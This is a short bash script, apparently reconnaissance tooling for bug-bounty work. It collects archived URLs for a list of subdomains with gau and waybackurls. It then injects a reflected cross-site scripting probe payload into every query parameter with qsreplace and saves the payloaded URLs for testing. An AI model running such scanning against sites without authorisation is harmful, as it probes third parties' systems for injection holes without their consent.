#!/bin/bash
OUT=$1
mkdir -p $OUT/params
cat $OUT/subdomains/all.txt | gau >> $OUT/params/gau.txt
cat $OUT/subdomains/all.txt | waybackurls >> $OUT/params/wayback.txt
cat $OUT/params/*.txt | sort -u | tee $OUT/params/all-urls.txt
grep "=" $OUT/params/all-urls.txt | qsreplace '"><script>alert(1)</script>' > \
	$OUT/params/payloaded-xss.txt
